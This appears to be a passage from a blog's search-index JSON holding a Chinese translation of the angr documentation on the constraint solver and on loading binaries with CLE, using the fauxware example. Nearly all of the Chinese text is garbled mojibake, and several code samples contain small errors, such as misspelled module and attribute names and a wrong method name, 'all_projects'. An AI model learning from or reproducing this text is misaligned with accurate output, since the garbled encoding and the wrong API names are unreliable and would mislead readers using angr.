æƒ³å°½å¯èƒ½ä¿ç•™è¯¥å€¼ï¼Œå°±åƒå°†floatç±»å‹å€¼è½¬åŒ–ä¸ºintå€¼ä¸€æ ·ï¼Œä½ å¯ä»¥ä½¿ç”¨val_to_fpå’Œval_to_bvã€‚ç”±äºæµ®ç‚¹æ•°çš„æµ®ç‚¹ç‰¹æ€§ï¼Œè¿™äº›æ–¹æ³•å¿…é¡»å°†ç›®æ ‡å€¼çš„å¤§å°æˆ–æ’åºï¼ˆsortï¼‰ä½œä¸ºå‚æ•°ã€‚ \u003e\u003e\u003e a \u003cFP64 FPV(3.2, DOUBLE)\u003e \u003e\u003e\u003e a.val_to_bv(12) \u003cBV12 0x3\u003e \u003e\u003e\u003e a.val_to_bv(12).val_to_fp(state.solver.fp.FSORT_FLOAT) \u003cFP32 FPV(3.0, FLOAT)\u003e è¿™äº›æ–¹æ³•è¿˜å¯ä»¥ä½¿ç”¨æœ‰ç¬¦å·å‚æ•°ï¼ŒæŒ‡å®šæºæˆ–ç›®æ ‡bitvectorçš„ç¬¦å·ã€‚ ","date":"2022-09-12","objectID":"/2022/09/solver_engine/:4:0","tags":["reverse","angr"],"title":"angræ–‡æ¡£ç¿»è¯‘ï¼ˆå››ï¼‰Solver Engine","uri":"/2022/09/solver_engine/"},{"categories":["Angr"],"content":"æ›´å¤šæ±‚è§£æ–¹æ³•ï¼ˆMore Solving Methodsï¼‰ evalåªä¼šè¿”å›ç»™ä½ ä¸€ä¸ªå¯èƒ½çš„æœ‰æ•ˆå€¼ï¼Œä½†æ˜¯ï¼Œå¦‚æœä½ æƒ³è¦ä¸æ­¢ä¸€ä¸ªå‘¢ï¼Ÿ å¦‚æœä½ æƒ³ç¡®ä¿æœ‰æ•ˆå€¼å”¯ä¸€æ€ä¹ˆåŠï¼Ÿæ±‚è§£å™¨ä¸ºä½ æä¾›äº†å‡ ç§å¸¸è§çš„æ±‚è§£æ–¹æ³• solver.eval(expression)ä¼šè¿”å›ä¸€ä¸ªå¯èƒ½çš„æœ‰æ•ˆå€¼ solver.eval_one(expression)ä¼šè¿”å›ä¸€ä¸ªæœ‰æ•ˆå€¼ï¼Œè‹¥æœ‰æ•ˆå€¼ä¸å”¯ä¸€å°†ä¼šæŠ›å‡ºä¸€ä¸ªé”™è¯¯ solver.eval_upto(expression, n)ä¼šè¿”å›è‡³å¤šnä¸ªå¯èƒ½çš„æœ‰æ•ˆå€¼ï¼Œå¦‚æœå¯èƒ½çš„æœ‰æ•ˆå€¼ä¸è¶³nä¸ªï¼Œåˆ™è¿”å›æ‰€æœ‰æœ‰æ•ˆå€¼ solver.eval_atleast(expression, n)ä¼šè¿”å›nä¸ªå¯èƒ½çš„æœ‰æ•ˆå€¼ï¼Œå¦‚æœå¯èƒ½çš„æœ‰æ•ˆå€¼ä¸è¶³nä¸ªï¼Œåˆ™ä¼šæŠ›å‡ºä¸€ä¸ªé”™è¯¯ solver.eval_exact(expression, n)ä¼šè¿”å›nä¸ªå¯èƒ½çš„æœ‰æ•ˆå€¼ï¼Œè‹¥å¯èƒ½çš„æœ‰æ•ˆå€¼æ•°é‡ä¸æ˜¯nä¸ªï¼Œåˆ™ä¼šæŠ›å‡ºä¸€ä¸ªé”™è¯¯ solver.min(expression)ä¼šè¿”å›æœ€å°çš„å¯èƒ½æœ‰æ•ˆå€¼ solver.max(expression)ä¼šè¿”å›æœ€å¤§çš„å¯èƒ½æœ‰æ•ˆå€¼ å¦å¤–ï¼Œä»¥ä¸Šæ‰€æœ‰æ±‚è§£æ–¹æ³•éƒ½å¯ä»¥é‡‡ç”¨ä»¥ä¸‹å…³é”®å­—å‚æ•° extra_constraintså¯ä»¥ä»¥ä¸€ä¸ªå…ƒç»„çš„å½¢å¼ä¼ é€’çº¦æŸæ¡ä»¶ã€‚è¿™äº›çº¦æŸå°†è¢«è€ƒè™‘ä»…æ±‚è§£ä¸­ï¼Œä½†ä¸ä¼šè¢«åŠ å…¥stateä¸­ cast_toå¯ä»¥ä¼ é€’ä¸€ä¸ªæ•°æ®ç±»å‹ï¼ŒæŒ‡å®šç»“æœè½¬æ¢æˆæŸç§å½¢å¼ï¼Œç›®å‰ï¼Œè¿™ä¸ªå‚æ•°åªèƒ½æ˜¯intæˆ–bytesï¼Œä¾‹å¦‚ï¼šstate.solver.eval(state.solver.BVV(0x41424344, 32), cast_to=bytes)å°†ä¼šè¿”å›b'ABCD' ","date":"2022-09-12","objectID":"/2022/09/solver_engine/:5:0","tags":["reverse","angr"],"title":"angræ–‡æ¡£ç¿»è¯‘ï¼ˆå››ï¼‰Solver Engine","uri":"/2022/09/solver_engine/"},{"categories":["Angr"],"content":"æ€»ç»“ï¼ˆSummaryï¼‰ ä½ å·²ç»å­¦åˆ°äº†å¾ˆå¤šï¼é˜…è¯»æœ¬èŠ‚åï¼Œä½ åº”è¯¥èƒ½å¤Ÿåˆ›å»ºå’Œæ“ä½œbitvectorã€å¸ƒå°”å€¼ã€æµ®ç‚¹å€¼æ„é€ æ“ä½œæ ‘ï¼Œç„¶åæŸ¥è¯¢é™„åŠ åœ¨æŸä¸ªstateçš„çº¦æŸæ±‚è§£å™¨ï¼Œæ¥è·å¾—çº¦æŸæ¡ä»¶ä¸‹çš„å¯èƒ½è§£ã€‚å¸Œæœ›åˆ°æ­¤ä¸ºæ­¢ï¼Œä½ èƒ½äº†è§£ASTè¡¨ç¤ºè®¡ç®—ä»¥åŠçº¦æŸæ±‚è§£å™¨çš„å¼ºå¤§åŠŸèƒ½ã€‚ åœ¨é™„å½•ä¸­ï¼Œä½ å¯ä»¥æ‰¾åˆ°åº”ç”¨äºASTçš„æ‰€æœ‰æ“ä½œçš„å‚è€ƒï¼Œå½“ä½ éœ€è¦æ—¶å¯ä»¥å¿«é€ŸæŸ¥é˜…ã€‚ ","date":"2022-09-12","objectID":"/2022/09/solver_engine/:6:0","tags":["reverse","angr"],"title":"angræ–‡æ¡£ç¿»è¯‘ï¼ˆå››ï¼‰Solver Engine","uri":"/2022/09/solver_engine/"},{"categories":["Angr"],"content":"Loading a Binary åœ¨ä¹‹å‰çš„æ–‡æ¡£ä¸­ï¼Œä½ ä»…ä»…å¯¹angrçš„åŠ è½½åŠŸèƒ½è¿›è¡Œäº†ä¸€ä¸ªç®€å•çš„ä½¿ç”¨â€”â€”ä½ åŠ è½½äº†/bin/trueï¼Œç„¶ååœ¨æ²¡æœ‰åŠ¨æ€è¿æ¥åº“çš„æƒ…å†µä¸‹å†æ¬¡åŠ è½½äº†å®ƒã€‚ä½ ä¹Ÿçœ‹åˆ°äº†ä¸€äº›angræä¾›ç»™ä½ çš„æŒ‡ä»¤æ¯”å¦‚proj.factoryã€‚ç°åœ¨ï¼Œæˆ‘ä»¬å°†æ·±å…¥è¿™äº›æŒ‡ä»¤ï¼Œäº†è§£å®ƒä»¬ä¹‹é—´çš„å·®åˆ«ä»¥åŠå®ƒä»¬èƒ½æä¾›ç»™ä½ ä»€ä¹ˆä¿¡æ¯ã€‚ æˆ‘ä»¬ç®€è¦çš„ä»‹ç»äº†angrçš„äºŒè¿›åˆ¶åŠ è½½ç»„ä»¶CLEï¼ˆCLE Loads Everythingï¼‰ï¼Œå®ƒå¸¸è¢«ç”¨æ¥è·å–äºŒè¿›åˆ¶ç¨‹åºï¼ˆä»¥åŠå®ƒçš„ä¾èµ–åº“ï¼‰ï¼Œå¹¶ä¸”å¯ä»¥å°†è¿™äº›ä¿¡æ¯ä»¥æ˜“äºä½¿ç”¨çš„å½¢å¼ä¼ é€’ç»™angrçš„å…¶ä»–ç»„ä»¶ ","date":"2022-09-08","objectID":"/2022/09/loading_a_binary/:0:0","tags":["reverse","angr"],"title":"angræ–‡æ¡£ç¿»è¯‘ï¼ˆä¸‰ï¼‰Loading a Binary","uri":"/2022/09/loading_a_binary/"},{"categories":["Angr"],"content":"åŠ è½½å™¨ï¼ˆThe Loaderï¼‰ æˆ‘ä»¬ä»¥åŠ è½½example/fauxware/fauxwareä¸ºä¾‹ï¼Œå¯¹å¦‚ä½•ä¸åŠ è½½å™¨äº¤äº’è¿›è¡Œä¸€ä¸ªæ·±å…¥çš„æ¢ç©¶ã€‚ \u003e\u003e\u003e import angr, mokeyhex \u003e\u003e\u003e proj = angr.Project('example/fauxware/fauxware') \u003e\u003e proj.loader \u003cLoaded fauxware, maps [0x400000:0x5008000]\u003e ","date":"2022-09-08","objectID":"/2022/09/loading_a_binary/:1:0","tags":["reverse","angr"],"title":"angræ–‡æ¡£ç¿»è¯‘ï¼ˆä¸‰ï¼‰Loading a Binary","uri":"/2022/09/loading_a_binary/"},{"categories":["Angr"],"content":"åŠ è½½çš„å¯¹è±¡ï¼ˆLoaded Objectsï¼‰ CLEåŠ è½½å™¨ï¼ˆcle.loaderï¼‰æ˜¯è¢«åŠ è½½çš„äºŒè¿›åˆ¶å¯¹è±¡çš„ä¸€ä¸ªé›†åˆï¼Œè¢«åŠ è½½å¹¶æ˜ å°„åˆ°å•ç‹¬çš„å†…å­˜ç©ºé—´ã€‚æ¯ä¸ªäºŒè¿›åˆ¶å¯¹è±¡éƒ½å¯ä»¥è¢«ç›¸å¯¹åº”çš„åŠ è½½å™¨åç«¯åŠ è½½ï¼ˆcle.Backendçš„å­ç±»ï¼‰ã€‚ä¾‹å¦‚ç”¨cle.ELFåŠ è½½ELFæ–‡ä»¶ åœ¨å†…å­˜ä¸­ä¹Ÿæœ‰ä¸åŠ è½½çš„äºŒè¿›åˆ¶ç¨‹åºæ— å…³çš„å¯¹è±¡ã€‚æ¯”å¦‚ç”¨æ¥æä¾›çº¿ç¨‹æœ¬åœ°å­˜å‚¨æ”¯æŒçš„å¯¹è±¡ï¼Œç”¨æ¥æä¾›æœªè§£æç¬¦å·çš„å¤–éƒ¨å¯¹è±¡externs oobjectã€‚ ä½ å¯ä»¥ä½¿ç”¨loader.all_objectsæ¥æŸ¥çœ‹CLEåŠ è½½çš„æ‰€æœ‰å¯¹è±¡ï¼Œè¿˜å¯ä»¥é€šè¿‡ç‰¹å®šå‘½ä»¤æŸ¥çœ‹ä¸€äº›æ›´æœ‰é’ˆå¯¹æ€§çš„åˆ†ç±» # æ‰€æœ‰åŠ è½½çš„å¯¹è±¡ \u003e\u003e\u003e proj.loader.all_projects [\u003cELF Object fauxware, maps [0x400000:0x60105f]\u003e, \u003cELF Object libc-2.23.so, maps [0x1000000:0x13c999f]\u003e, \u003cELF Object ld-2.23.so, maps [0x2000000:0x2227167]\u003e, \u003cELFTLSObject Object cle##tls, maps [0x3000000:0x3015010]\u003e, \u003cExternObject Object cle##externs, maps [0x4000000:0x4008000]\u003e, \u003cKernelObject Object cle##kernel, maps [0x5000000:0x5008000]\u003e] # è¿™æ˜¯mainå¯¹è±¡ï¼Œä½ åœ¨åŠ è½½é¡¹ç›®æ—¶ç›´æ¥æŒ‡å®šçš„å¯¹è±¡ \u003e\u003e\u003e proj.loader.main_object \u003cELF Object fauxware, maps [0x400000:0x60105f]\u003e # è¿™æ˜¯åŠ¨æ€é“¾æ¥åº“å¯¹è±¡åç§°å’Œåˆ°å¯¹è±¡çš„æ˜ å°„å­—å…¸ \u003e\u003e\u003e proj.loader.shared_objects { 'fauxware': \u003cELF Object fauxware, maps [0x400000:0x60105f]\u003e, 'libc.so.6': \u003cELF Object libc-2.23.so, maps [0x1000000:0x13c999f]\u003e, 'ld-linux-x86-64.so.2': \u003cELF Object ld-2.23.so, maps [0x2000000:0x2227167]\u003e } # è¿™æ˜¯ä»ELFæ–‡ä»¶åŠ è½½çš„æ‰€æœ‰å¯¹è±¡ # å¦‚æœè¿™æ˜¯windowsæ–‡ä»¶ï¼Œä½ å¯ä»¥ä½¿ç”¨all_pe_objects \u003e\u003e\u003e proj.loader.all_elf_objects [\u003cELF Object fauxware, maps [0x400000:0x60105f]\u003e, \u003cELF Object libc-2.23.so, maps [0x1000000:0x13c999f]\u003e, \u003cELF Object ld-2.23.so, maps [0x2000000:0x2227167]\u003e] # è¿™æ˜¯externså¯¹è±¡ï¼Œå®ƒç”¨æ¥ä¸ºæœªè§£æçš„å¯¼å…¥ç¬¦å·å’Œangrå†…éƒ¨è¿è¡Œæä¾›åœ°å€ \u003e\u003e\u003e proj.loader.extern_object \u003cExternObject Object cle##externs, maps [0x4000000:0x4008000]\u003e # è¯¥å¯¹è±¡ä¸ºæ¨¡æ‹Ÿç³»ç»Ÿè°ƒç”¨æä¾›åœ°å€ \u003e\u003e\u003e proj.loader.kernel_object \u003cKernelObject Object cle##kernel, maps [0x5000000:0x5008000]\u003e # æœ€åï¼Œä½ å¯ä»¥è·å¾—ç»™å®šåœ°å€å¯¹è±¡çš„å¼•ç”¨ \u003e\u003e\u003e proj.loader.find_object_containing(0x400000) \u003cELF Object fauxware, maps [0x400000:0x60105f]\u003e ä½ å¯ä»¥ç›´æ¥ä¸è¿™äº›å¯¹è±¡äº¤äº’ï¼Œä»ä¸­æå–æ•°æ® \u003e\u003e\u003e obj = proj.loader.main_object # å¯¹è±¡çš„å…¥å£ç‚¹ \u003e\u003e\u003e obj.entry 0x400580 \u003e\u003e\u003e obj.mmin_addr, obj.max_addr (0x400000, 0x60105f) # æŸ¥çœ‹ELFæ–‡ä»¶çš„æ®µï¼ˆsegmetsï¼‰å’ŒèŠ‚ï¼ˆsectionï¼‰ \u003e\u003e\u003e obj.segments \u003cRegions: [\u003cELFSegment memsize=0xa74, filesize=0xa74, vaddr=0x400000, flags=0x5, offset=0x0\u003e, \u003cELFSegment memsize=0x238, filesize=0x228, vaddr=0x600e28, flags=0x6, offset=0xe28\u003e]\u003e \u003e\u003e\u003e obj.sections \u003cRegions: [\u003cUnnamed | offset 0x0, vaddr 0x0, size 0x0\u003e, \u003c.interp | offset 0x238, vaddr 0x400238, size 0x1c\u003e, \u003c.note.ABI-tag | offset 0x254, vaddr 0x400254, size 0x20\u003e, ...etc # ä½ å¯ä»¥ç»™å®šåœ°å€è·å–ç‰¹å®šçš„æ®µå’ŒèŠ‚ \u003e\u003e\u003e obj.find_segment_containing(obj.entry) \u003cELFSegment memsize=0xa74, filesize=0xa74, vaddr=0x400000, flags=0x5, offset=0x0\u003e \u003e\u003e\u003e obj.find_section_containing(obj.entry) \u003c.text | offset 0x580, vaddr 0x400580, size 0x338\u003e # è·å–ç¬¦å·åœ¨PLTè¡¨ä¸­çš„åœ°å€ï¼Œæˆ–æ ¹æ®åœ°å€å–å¾—ç›¸åº”çš„ç¬¦å· \u003e\u003e\u003e addr = obj.plt['strcmp'] \u003e\u003e\u003e addr 0x400550 \u003e\u003e\u003e obj.reverse_plt[addr] 'strcmp' # æ˜¾ç¤ºå¯¹è±¡çš„é¢„é“¾æ¥åŸºåœ°å€åŠå®ƒå®é™…è¢«CLEæ˜ å°„åˆ°å†…å­˜ä¸­çš„åœ°å€ \u003e\u003e\u003e obj.linked_base 0x400000 \u003e\u003e\u003e obj.mapped_base 0x400000 ","date":"2022-09-08","objectID":"/2022/09/loading_a_binary/:2:0","tags":["reverse","angr"],"title":"angræ–‡æ¡£ç¿»è¯‘ï¼ˆä¸‰ï¼‰Loading a Binary","uri":"/2022/09/loading_a_binary/"},{"categories":["Angr"],"content":"ç¬¦å·å’Œé‡å®šä½ï¼ˆSymbols and Relocationsï¼‰ ä½ ä¹Ÿå¯ä»¥ä½¿ç”¨CLEæ“ä½œç¬¦å·ã€‚ç¬¦å·æ˜¯å¯æ‰§è¡Œæ–‡ä»¶ä¸­çš„ä¸€ä¸ªé‡è¦çš„æ¦‚å¿µï¼Œå®ç°äº†åç§°åˆ°åœ°å€çš„æ˜ å°„ã€‚ ä»CLEä¸­è·å–ä¸€ä¸ªç¬¦å·æœ€ç®€å•çš„æ–¹æ³•æ˜¯ä½¿ç”¨loader.find_symbolï¼Œå®ƒæ¥æ”¶ä¸€ä¸ªç¬¦å·åæˆ–åœ°å€ä½œä¸ºå‚æ•°ï¼Œè¿”å›ä¸€ä¸ªç¬¦å·å¯¹è±¡ \u003e\u003e\u003e strcmp = proj.loader.find_symbol('strcmp') \u003e\u003e\u003e strcmp \u003cSymbol \"strcmp\" in libc.so.6 at 0x1089cd0\u003e ä¸€ä¸ªç¬¦å·æœ€æœ‰ç”¨çš„å±æ€§æ˜¯å®ƒçš„åç§°ã€æ‰€æœ‰è€…å’Œåœ°å€ï¼Œä½†ç¬¦å·çš„åœ°å€è¡¨ç¤ºä¸æ­¢ä¸€ç§ï¼Œsymbolå¯¹è±¡åœ°å€æœ‰ä¸‰ç§è¡¨ç¤ºæ–¹å¼ï¼š .rebased_addræ˜¯ç¬¦å·åœ¨å…¨å±€åœ°å€ç©ºé—´çš„åœ°å€ï¼Œè¿™å°±æ˜¯åœ¨ä¸Šé¢å‘½ä»¤å±å¹•ä¸Šè¾“å‡ºçš„åœ°å€ .linked_addræ˜¯å®ƒç›¸å¯¹äºäºŒè¿›åˆ¶æ–‡ä»¶é¢„é“¾æ¥ï¼ˆprelinkï¼‰åŸºå€çš„åœ°å€ã€‚è¿™ä¸ªåœ°å€ä¼šåœ¨ä¾‹å¦‚readelf(1)ä¸­æ˜¾ç¤º .relative_addræ˜¯å®ƒç›¸å¯¹äºå¯¹è±¡åŸºåœ°å€çš„åœ°å€ã€‚è¿™ç»å¸¸åœ¨æ–‡çŒ®ä¸­è¢«ä½¿ç”¨ï¼ˆå°¤å…¶åœ¨windowsæ–‡æ¡£ï¼‰ï¼Œè¢«ç§°ä¸ºRVAï¼ˆrelative virtual addressï¼‰ \u003e\u003e\u003e strcmp.name 'strcmp' \u003e\u003e\u003e strcmp.owner \u003cELF Object libc-2.23.so, maps [0x1000000:0x13c999f]\u003e \u003e\u003e\u003e strcmp.rebased_addr 0x1089cd0 \u003e\u003e\u003e strcmp.linked_addr 0x89cd0 \u003e\u003e\u003e strcmp.relative_addr 0x89cd0 é™¤äº†æä¾›è°ƒè¯•ä¿¡æ¯ä¹‹å¤–ï¼Œç¬¦å·å¯¹è±¡ä¹Ÿæ”¯æŒåŠ¨æ€é“¾æ¥ã€‚libcæä¾›äº†å¦‚strcmpç­‰å¤–éƒ¨ç¬¦å·ï¼Œè€Œmainç¨‹åºéœ€è¦ä½¿ç”¨å®ƒã€‚å¦‚æœæˆ‘ä»¬è®©CLEç›´æ¥ä»mainå¯¹è±¡ç»™æˆ‘ä»¬ä¸€ä¸ªstrcmpç¬¦å·ï¼Œå®ƒä¼šå‘Šè¯‰ä½ è¿™æ˜¯ä¸ªå¯¼å…¥ç¬¦å·ã€‚å¯¼å…¥ç¬¦å·å¹¶æ²¡æœ‰ä¸ä¹‹å…³è”çš„æœ‰æ„ä¹‰çš„åœ°å€ï¼Œä½†å®ƒä»¬æä¾›äº†ç”¨äºè§£æå®ƒä»¬çš„å¼•ç”¨ï¼Œé€šè¿‡.resolvedbyå±æ€§å¯ä»¥å¾—åˆ°ã€‚ \u003e\u003e\u003e strcmp.is_export True \u003e\u003e\u003e strcmp.is_import False # åœ¨åŠ è½½å™¨å±‚é¢ï¼Œè¿™æ¡æŒ‡ä»¤æ˜¯find_symbol,å› ä¸ºå®ƒæ˜¯æ‰§è¡Œäº†æœç´¢å‘½ä»¤æŸ¥æ‰¾ç¬¦å· # åœ¨ä¸€ä¸ªç‰¹å®šçš„å¯¹è±¡å±‚é¢ï¼Œè¿™æ¡æŒ‡ä»¤æ˜¯get_symbolï¼Œå› ä¸ºä¸€ä¸ªæŒ‡å®šçš„åç§°åªæœ‰ä¸€ä¸ªç¬¦å·ä¸ä¹‹å¯¹åº” \u003e\u003e\u003e main_strcmp = proj.loader.main_object.get_symbol('strcmp') \u003e\u003e\u003e main_strcmp \u003cSymbol \"strcmp\" in fauxware (import)\u003e \u003e\u003e\u003e main_strcmp.is_export False \u003e\u003e\u003e main_strcmp.is_import True \u003e\u003e\u003e main_strcmp.resolvedby \u003cSymbol \"strcmp\" in libc.so.6 at 0x1089cd0\u003e é€šè¿‡é“¾æ¥åœ¨å†…å­˜ä¸­å°†å¤–éƒ¨ç¬¦å·æ³¨å†Œä¸ºå¯¼å…¥ç¬¦å·ç”±å¦ä¸€ä¸ªæ¦‚å¿µâ€œé‡å®šä½â€å¤„ç†ã€‚é‡å®šä½å°†[import]å’Œå¤–éƒ¨ç¬¦å·åŒ¹é…ï¼Œå°†å¯¼å‡ºåœ°å€å†™å…¥[location]ï¼Œæ ¼å¼ä¸º[format]ã€‚ä½¿ç”¨obj.relocså¯ä»¥çœ‹åˆ°ä¸€ä¸ªå¯¹è±¡å®Œæ•´çš„é‡å®šä½è¡¨ï¼ˆé‡å®šä½å®ä¾‹ï¼‰ï¼Œæˆ–è€…ä½¿ç”¨obj.importsè·å–ä»ç¬¦å·ååˆ°é‡å®šä½è¡¨é¡¹çš„æ˜ å°„ï¼Œè¿™é‡Œæ²¡æœ‰ç»™å‡ºç›¸åº”çš„å¤–éƒ¨ç¬¦å· é‡å®šä½å¯¹åº”çš„å¯¼å…¥ç¬¦å·å¯ä»¥ç”¨.symbolè®¿é—®ï¼Œé‡å®šä½å†™å…¥çš„åœ°å€å¯é€šè¿‡Symbolå¯¹è±¡çš„ä»»ä½•åœ°å€æ ‡è¯†ç¬¦å¾—åˆ°ï¼Œä½ ä¹Ÿå¯ä»¥ä½¿ç”¨.ownerè·å–å¯¹é‡å®šä½å¯¹è±¡çš„å¼•ç”¨ã€‚ # é‡å®šä½è¡¨é¡¹æ— æ³•å¾ˆå¥½çš„æ‰“å°, æ‰€ä»¥è¿™äº›åœ°å€æ˜¯pythonå†…éƒ¨çš„, ä¸angræ— å…³ \u003e\u003e\u003e proj.loader.shared_objects['libc.so.6'].imports {'__libc_enable_secure': \u003ccle.backends.elf.relocation.amd64.R_X86_64_GLOB_DAT at 0x7ff5c5fce780\u003e, '__tls_get_addr': \u003ccle.backends.elf.relocation.amd64.R_X86_64_JUMP_SLOT at 0x7ff5c6018358\u003e, '_dl_argv': \u003ccle.backends.elf.relocation.amd64.R_X86_64_GLOB_DAT at 0x7ff5c5fd2e48\u003e, '_dl_find_dso_for_object': \u003ccle.backends.elf.relocation.amd64.R_X86_64_JUMP_SLOT at 0x7ff5c6018588\u003e, '_dl_starting_up': \u003ccle.backends.elf.relocation.amd64.R_X86_64_GLOB_DAT at 0x7ff5c5fd2550\u003e, '_rtld_global': \u003ccle.backends.elf.relocation.amd64.R_X86_64_GLOB_DAT at 0x7ff5c5fce4e0\u003e, '_rtld_global_ro': \u003ccle.backends.elf.relocation.amd64.R_X86_64_GLOB_DAT at 0x7ff5c5fcea20\u003e} å¦‚æœå¯¼å…¥ç¬¦å·æ— æ³•è§£æä¸ºä»»ä½•å¤–éƒ¨ç¬¦å·ï¼Œä¾‹å¦‚ï¼Œä¸€ä¸ªéœ€è¦çš„å…±äº«åº“æ— æ³•æ‰¾åˆ°ï¼ŒCLEä¼šè‡ªåŠ¨å°†å…¶æ›´æ–°ä¸ºå¤–éƒ¨å¯¹è±¡ï¼ˆloader.extern_objï¼‰ï¼Œè¡¨æ˜CLEæä¾›è¿™ä¸ªç¬¦å·ä½œä¸ºå¤–éƒ¨ç¬¦å·ã€‚ ","date":"2022-09-08","objectID":"/2022/09/loading_a_binary/:3:0","tags":["reverse","angr"],"title":"angræ–‡æ¡£ç¿»è¯‘ï¼ˆä¸‰ï¼‰Loading a Binary","uri":"/2022/09/loading_a_binary/"},{"categories":["Angr"],"content":"åŠ è½½é€‰é¡¹ï¼ˆLoading Optionsï¼‰ å¦‚æœä½ ä½¿ç”¨angr.Projectæ¥åŠ è½½æŸäº›å†…å®¹ï¼Œé‚£ä¹ˆä½ ä¼ é€’ç»™Projectæ„é€ å™¨çš„å…³é”®è¯å‚æ•°ä¼šç›´æ¥ä¼ é€’ç»™cle.Loaderã€‚å¦‚æœä½ æƒ³äº†è§£æ‰€æœ‰å¯ä»¥ä½¿ç”¨çš„å‚æ•°ï¼Œä½ åº”è¯¥æŸ¥çœ‹CLE API docsã€‚åœ¨ä¸‹é¢æˆ‘ä»¬ä¼šä»‹ç»ä¸€äº›é‡è¦ä¸”å¸¸ç”¨çš„é€‰é¡¹ã€‚ ","date":"2022-09-08","objectID":"/2022/09/loading_a_binary/:4:0","tags":["reverse","angr"],"title":"angræ–‡æ¡£ç¿»è¯‘ï¼ˆä¸‰ï¼‰Loading a Binary","uri":"/2022/09/loading_a_binary/"},{"categories":["Angr"],"content":"åŸºæœ¬é€‰é¡¹ï¼ˆBasic Optionsï¼‰ auto_load_libsç”¨æ¥æŒ‡å®šæ˜¯å¦å¯ç”¨CLEè‡ªåŠ¨åŠ è½½å…±äº«åº“ï¼Œé»˜è®¤å¼€å¯ã€‚ç›¸åçš„ï¼Œexcept_missing_libsï¼Œè®¾ç½®ä¸ºtrueæ—¶å¦‚æœäºŒè¿›åˆ¶æ–‡ä»¶å­˜åœ¨æ— æ³•è§£æçš„å…±äº«åº“ä¾èµ–æ—¶ï¼Œä¼šå¼•å‘ä¸€ä¸ªå¼‚å¸¸ã€‚ force_load_libsæ¥æ”¶ä¸€ä¸ªå­—ç¬¦ä¸²åˆ—è¡¨ï¼Œåˆ—è¡¨ä¸­çš„å­—ç¬¦ä¸²è¢«è§†ä¸ºå¿…é¡»åŠ è½½çš„å…±äº«åº“ï¼Œæˆ–è€…ä½ å¯ä»¥ä½¿ç”¨skip_libsä¼ é€’ä¸€ä¸ªå­—ç¬¦ä¸²åˆ—è¡¨è·³è¿‡æŒ‡å®šå…±äº«åº“çš„è§£æã€‚å¯ä»¥é€šè¿‡ld_pathä¼ é€’ä¸€ä¸ªå­—ç¬¦ä¸²åˆ—è¡¨æˆ–å­—ç¬¦ä¸²ä½œä¸ºå…±äº«åº“çš„é¢å¤–æ£€ç´¢è·¯å¾„ï¼Œä¼˜å…ˆçº§é«˜äºç¨‹åºæ‰€åœ¨ç›®å½•ã€å·¥ä½œç›®å½•å’Œç³»ç»Ÿå…±äº«åº“ç›®å½•ã€‚ ","date":"2022-09-08","objectID":"/2022/09/loading_a_binary/:4:1","tags":["reverse","angr"],"title":"angræ–‡æ¡£ç¿»è¯‘ï¼ˆä¸‰ï¼‰Loading a Binary","uri":"/2022/09/loading_a_binary/"},{"categories":["Angr"],"content":"äºŒè¿›åˆ¶åŠ è½½é€‰é¡¹ï¼ˆPre-Binary Optionsï¼‰ CLEåŒæ ·å…è®¸ä½ æŒ‡å®šä¸€äº›ä»…é€‚ç”¨äºç‰¹å®šäºŒè¿›åˆ¶å¯¹è±¡çš„é€‰é¡¹ï¼Œå¯ä»¥ä½¿ç”¨main_optså’Œlib_optså‚æ•°ä¼ é€’é€‰é¡¹å­—å…¸æ¥å®ç°ã€‚main_optsæ˜¯ä»é€‰é¡¹åç§°åˆ°é€‰é¡¹å€¼çš„æ˜ å°„ï¼Œlib_optsæ˜¯ä»åº“åç§°åˆ°é€‰é¡¹å­—å…¸çš„æ˜ å°„ã€‚ ä½ å¯ä»¥ä½¿ç”¨çš„é€‰é¡¹ç”±ä½¿ç”¨çš„åç«¯ï¼ˆbackendï¼‰å†³å®šï¼Œä½†ä¸€äº›å¸¸è§çš„é€‰é¡¹æ˜¯é€šç”¨çš„ backendï¼šä½¿ç”¨å“ªç§åç«¯ï¼Œå€¼ä¸ºç±»æˆ–åç§° base_addrï¼šåŠ è½½çš„åŸºåœ°å€ entry_pointï¼šç¨‹åºå…¥å£ç‚¹ archï¼šä½¿ç”¨æ¶æ„çš„åç§° ä¾‹å¦‚ï¼š \u003e\u003e\u003e angr.Project('examples/fauxware/fauxware', main_opts={'backend': 'blob', 'arch': 'i386'}, lib_opts={'libc.so.6': {'backend': 'elf'}}) \u003cProject examples/fauxware/fauxware\u003e ","date":"2022-09-08","objectID":"/2022/09/loading_a_binary/:4:2","tags":["reverse","angr"],"title":"angræ–‡æ¡£ç¿»è¯‘ï¼ˆä¸‰ï¼‰Loading a Binary","uri":"/2022/09/loading_a_binary/"},{"categories":["Angr"],"content":"åç«¯ï¼ˆBackendsï¼‰ CLEç›®å‰æœ‰é™æ€åŠ è½½ELFã€PEã€CGCã€Mach-Oå’ŒELF core dump æ–‡ä»¶çš„åç«¯ï¼Œæˆ–è€…æŠŠæ–‡ä»¶åŠ è½½åˆ°ä¸€ä¸ªå¹³å¦åœ°å€ã€‚CLEåœ¨å¤§å¤šæ•°æƒ…å†µä¸‹ä¼šè‡ªåŠ¨æ£€æµ‹å¹¶ä½¿ç”¨åˆé€‚çš„åç«¯ã€‚æ‰€ä»¥ä½ æ— éœ€æ‰‹åŠ¨æŒ‡å®šä½¿ç”¨çš„åç«¯ï¼Œé™¤éä½ åœ¨åšä¸€äº›éå¸¸å¥‡æ€ªçš„äº‹æƒ…ã€‚ ä½ å¯ä»¥åœ¨é€‰é¡¹å­—å…¸ä¸­åŒ…å«ä¸€ä¸ªé”®æ¥å¼ºåˆ¶CLEä½¿ç”¨ç‰¹å®šçš„åç«¯ï¼Œä½†æœ‰äº›åç«¯æ— æ³•è‡ªåŠ¨æ£€æµ‹æ¶æ„ï¼Œéœ€è¦æ‰‹åŠ¨æŒ‡å®šæ‰€éœ€æ¶æ„ã€‚æ¶æ„çš„é”®å€¼æ— éœ€åŒ¹é…æŸä¸€ä¸ªæ¶æ„åˆ—è¡¨ï¼Œangrä¼šé€šè¿‡å‡ ä¹æ‰€æœ‰å—æ”¯æŒæ¶æ„çš„é€šç”¨æ ‡è¯†ç¬¦æ¥è¯†åˆ«ä½ æ‰€æŒ‡å®šçš„æ¶æ„ã€‚ è¦ä½¿ç”¨ç‰¹å®šçš„åç«¯ï¼Œè¯·æŒ‡å®šä¸‹è¡¨çš„åç§°ï¼š åç«¯å æè¿° æ˜¯å¦éœ€è¦æŒ‡å®šarch elf ELFé™æ€åŠ 